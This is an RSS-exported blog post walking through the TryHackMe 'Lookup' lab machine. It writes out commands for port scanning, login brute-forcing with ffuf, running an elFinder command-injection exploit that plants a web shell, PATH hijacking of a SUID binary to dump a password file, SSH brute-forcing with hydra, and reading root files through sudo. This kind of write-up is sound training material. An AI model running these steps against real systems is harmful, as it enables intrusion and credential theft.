<?xml version="1.0" encoding="UTF-8"?><rss xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:atom="http://www.w3.org/2005/Atom" version="2.0"><channel><title><![CDATA[Notes]]></title><description><![CDATA[Obsidian digital garden]]></description><link>http://github.com/dylang/node-rss</link><image><url>lib/media/favicon.png</url><title>Notes</title><link></link></image><generator>Webpage HTML Export plugin for Obsidian</generator><lastBuildDate>Tue, 26 Nov 2024 14:53:44 GMT</lastBuildDate><atom:link href="lib/rss.xml" rel="self" type="application/rss+xml"/><pubDate>Tue, 26 Nov 2024 14:53:43 GMT</pubDate><ttl>60</ttl><dc:creator></dc:creator><item><title><![CDATA[Lookup]]></title><description><![CDATA[ 
 <br>by <a data-tooltip-position="top" aria-label="https://tryhackme.com/p/tryhackme" rel="noopener nofollow" class="external-link" href="https://tryhackme.com/p/tryhackme" target="_blank">tryhackme</a> and <a data-tooltip-position="top" aria-label="https://tryhackme.com/p/josemlwdf" rel="noopener nofollow" class="external-link" href="https://tryhackme.com/p/josemlwdf" target="_blank">josemlwdf</a><br><img alt="Pasted image 20241124121258.png" src="pasted-image-20241124121258.png"><br>Test your enumeration skills on this boot-to-root machine.<br>Room link: <a rel="noopener nofollow" class="external-link" href="https://tryhackme.com/r/room/lookup" target="_blank">https://tryhackme.com/r/room/lookup</a><br><br>Lookup offers a treasure trove of learning opportunities for aspiring hackers. This intriguing machine showcases various real-world vulnerabilities, ranging from web application weaknesses to privilege escalation techniques. By exploring and exploiting these vulnerabilities, hackers can sharpen their skills and gain invaluable experience in ethical hacking. Through "Lookup," hackers can master the art of reconnaissance, scanning, and enumeration to uncover hidden services and subdomains. They will learn how to exploit web application vulnerabilities, such as command injection, and understand the significance of secure coding practices. The machine also challenges hackers to automate tasks, demonstrating the power of scripting in penetration testing.<br>
<br>IP Address: 10.10.57.212
<br><br>As usual, let's perform a nmap scan against the target system<br>sudo nmap -sV -sC -vv -T5 -oA Lookup.nmap 10.10.57.212
<br><img alt="Pasted image 20241124121657.png" src="pasted-image-20241124121657.png"><br>Here we see the following two ports to be open in the target system:<br>
<br>Port 22
<br>Port 80
<br><br>Let us first understand the web application of this target system. First let's edit the /etc/hosts file.<br>sudo nano /etc/hosts
<br>Add the following line:<br>10.10.57.212 lookup.thm
<br><img alt="Pasted image 20241124122059.png" src="pasted-image-20241124122059.png"><br>And now, browse the application using the URL: http://lookup.thm<br><img alt="Pasted image 20241124122041.png" src="pasted-image-20241124122041.png"><br>On further analysis of the web application, we see no other information being disclosed. Let's do some fuzzing for any other folders, files and vhosts using FFUF.<br><br><img alt="Pasted image 20241126144301.png" src="pasted-image-20241126144301.png"><br><br><img alt="Pasted image 20241126144357.png" src="pasted-image-20241126144357.png"><br><br><img alt="Pasted image 20241126144628.png" src="pasted-image-20241126144628.png"><br>None of these scans give us the required result, so we are with the Login page now. <br><br>After attempting multiple approaches of username and password, also with some basic SQL Injection payloads and Queries, we see no other result showing up in the application other than the redirection message.<br><img alt="Pasted image 20241126145232.png" src="pasted-image-20241126145232.png"><br>Now, let's intercept the login request using burp Suite and then save it to the Repeater for further analysis.<br><img alt="Pasted image 20241126145317.png" src="pasted-image-20241126145317.png"><br>In the repeater, we see a different content size (as the in the message) for different users.<br><br><img alt="Pasted image 20241126145658.png" src="pasted-image-20241126145658.png"><br>But for the admin user:<br><img alt="Pasted image 20241126145730.png" src="pasted-image-20241126145730.png"><br>Which confirms us that the username exists in the database, we can now fuzz for that user's password using ffuf.<br>ffuf -w ~/Pranava__Rao/Tools/Fuzzing\ List/SecLists/Passwords/2020-200_most_used_passwords.txt -u http://lookup.thm/login.php -X POST -d "username=admin&amp;password=FUZZ" -H "Content-Type: application/x-www-form-urlencoded; charset=UTF-8" -fw 8
<br><img alt="Pasted image 20241126150450.png" src="pasted-image-20241126150450.png"><br>Now, using this password, when I try to login into the application, we get a different error this time.<br><img alt="Pasted image 20241126150637.png" src="pasted-image-20241126150637.png"><br>OK, which means that this error message is actually stating the confirmation of the password to some other specific user, which is strange as the password was identified for the admin user by the tool. But, now, let's fuzz for the username using the password that we have got.<br>ffuf -w ~/Pranava__Rao/Tools/Fuzzing\ List/SecLists/Usernames/xato-net-10-million-usernames.txt -u http://lookup.thm/login.php -X POST -d "username=FUZZ&amp;password=&lt;Password Here&gt;" -H "Content-Type: application/x-www-form-urlencoded; charset=UTF-8" -fw 10
<br><img alt="Pasted image 20241126151754.png" src="pasted-image-20241126151754.png"><br>And we get another user!! jose!<br>Now, when we try to login using jose username and the password, we see that the web page is trying to redirect to another page files.lookup.thm.<br><img alt="Pasted image 20241126161946.png" src="pasted-image-20241126161946.png"><br>So, let's add that to our /etc/hosts file.<br>10.10.56.101 lookup.thm files.lookup.thm
<br><img alt="Pasted image 20241126162051.png" src="pasted-image-20241126162051.png"><br><br>And Here we see a elfinder application in front of us.<br><img alt="Pasted image 20241126162142.png" src="pasted-image-20241126162142.png"><br>After a bit of looking around, we know that this version of application is vulnerable.<br><img alt="Pasted image 20241126162339.png" src="pasted-image-20241126162339.png"><br>
Version 2.1.47<br><img alt="Pasted image 20241126162443.png" src="pasted-image-20241126162443.png"><br>link: <a rel="noopener nofollow" class="external-link" href="https://www.exploit-db.com/exploits/46481" target="_blank">https://www.exploit-db.com/exploits/46481</a><br>We can also see this request of the vulnerability being made in their <a data-tooltip-position="top" aria-label="https://github.com/Studio-42/elFinder/issues/2868" rel="noopener nofollow" class="external-link" href="https://github.com/Studio-42/elFinder/issues/2868" target="_blank">GitHub</a> Page.<br>This exploit requires Python 2.7 and to be able to accesses the connect.minimal.php to upload files. And the connect.minimal.php was accessible even without requiring us to login again.<br><img alt="Pasted image 20241126162859.png" src="pasted-image-20241126162859.png"><br>The vulnerability lies in the filename, which allows commands to be injected. The exploit creates a PHP web shell into the upload directory while uploading an arbitrary image.<br><img alt="Pasted image 20241126163113.png" src="pasted-image-20241126163113.png"><br>So, for this exploit, let's download any random image and then name it as SecSignal.jpg.<br><img alt="Pasted image 20241126163437.png" src="pasted-image-20241126163437.png"><br>and also download the exploit from the Exploit Database page.<br><img alt="Pasted image 20241126163347.png" src="pasted-image-20241126163347.png"><br>Now, let's run the script.<br>python2.7 CVE-201909194-ExploitDatabase.py http://files.lookup.thm/elFinder/
<br><img alt="Pasted image 20241126163645.png" src="pasted-image-20241126163645.png"><br>THAT WAS JUST MAGIC!!!!!!!!!!!!!!!!<br>Now! You can updated the she using netcat and payload from <a data-tooltip-position="top" aria-label="https://www.revshells.com/" rel="noopener nofollow" class="external-link" href="https://www.revshells.com/" target="_blank">Revshells</a><br>
For this box, I tried a multiple one shells, but the one which worked was nc mkfifo. Also, make sure that you URL Encode the payload.<br><img alt="Pasted image 20241126164209.png" src="pasted-image-20241126164209.png"><br>And Here we get the Shell!!!<br><img alt="Pasted image 20241126164040.png" src="pasted-image-20241126164040.png"><br>Let's upgrade the Shell to be a bit more useful than what we have right now, which we can do through python.<br>First, type in the following command:<br>python3 -c 'import pty; pty.spawn("/bin/bash")'
<br>Spawning /bin/bash using <a data-tooltip-position="top" aria-label="https://docs.python.org/3/library/pty.html" rel="noopener nofollow" class="external-link" href="https://docs.python.org/3/library/pty.html" target="_blank">Pythonâ€™s PTY module</a>, and connect the controlling shell with its standard I/O.<br>Then, once you get a shell, press Ctrl + Z which will backend the shell, then update the local terminal line settings with stty and bring the remote shell back.<br>stty raw -echo &amp;&amp; fg
<br><img alt="Pasted image 20241126164505.png" src="pasted-image-20241126164505.png"><br><br>Now, after we have got the shell and looking around in the system, we see that are having our user.txt flag in the think user's home directory, but are out of luck. Also, we notice a .passwords file in the same directory.<br><img alt="Pasted image 20241126164853.png" src="pasted-image-20241126164853.png"><br>Let's now do some further file path enumeration to find some useful files.<br>find / -perm /4000 2&gt;/dev/null
<br><img alt="Pasted image 20241126172335.png" src="pasted-image-20241126172335.png"><br>And Here!! We see a very un-common file to be present in the system.<br>/usr/sbin/pwm
<br><img alt="Pasted image 20241126172434.png" src="pasted-image-20241126172434.png"><br>This Tool, looks ups the user id, and then prints out the content from the .passwords file. and since we don't get any output of the file which is obvious as we don't have any /home directory containing the .passwords file. But the think user has one!!!<br>We can create a id file in the tmp directory and then try to run this file contain the think user's username in it.<br>echo 'echo "uid=1000(think) gid=1000(think) groups=1000(think)"' &gt; id
<br><img alt="Pasted image 20241126172941.png" src="pasted-image-20241126172941.png"><br>Make the file executable:<br>chmod +x id
<br>Now, let's add this path in the PATH of the system.<br>export PATH=/tmp:$PATH
<br><img alt="Pasted image 20241126173315.png" src="pasted-image-20241126173315.png"><br>Now, running the tool gives us the list of passwords!<br><img alt="Pasted image 20241126173929.png" src="pasted-image-20241126173929.png"><br>Now!! Let's take these passwords into our local machine into a file called password and crack the password for the think user using hydra<br>hydra -l think -P password.txt lookup.thm ssh
<br><img alt="Pasted image 20241126174253.png" src="pasted-image-20241126174253.png"><br>Now!! We can login to this user using the username and the password that we got!<br><img alt="Pasted image 20241126174413.png" src="pasted-image-20241126174413.png"><br>Now, buy running the sudo -l command, we see that we are able to see the commands that we can use as the root user.<br><img alt="Pasted image 20241126184638.png" src="pasted-image-20241126184638.png"><br>now let's run open the root.txt file using the look command.<br>sudo look '' /root/root.txt
<br><img alt="Pasted image 20241126184806.png" src="pasted-image-20241126184806.png"><br>That is it!!!!!!!!!<br><br><br>]]></description><link>lookup.html</link><guid isPermaLink="false">Lookup.md</guid><pubDate>Tue, 26 Nov 2024 13:18:37 GMT</pubDate><enclosure url="pasted-image-20241124121258.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src=&quot;pasted-image-20241124121258.png&quot;&gt;&lt;/figure&gt;</content:encoded></item></channel></rss>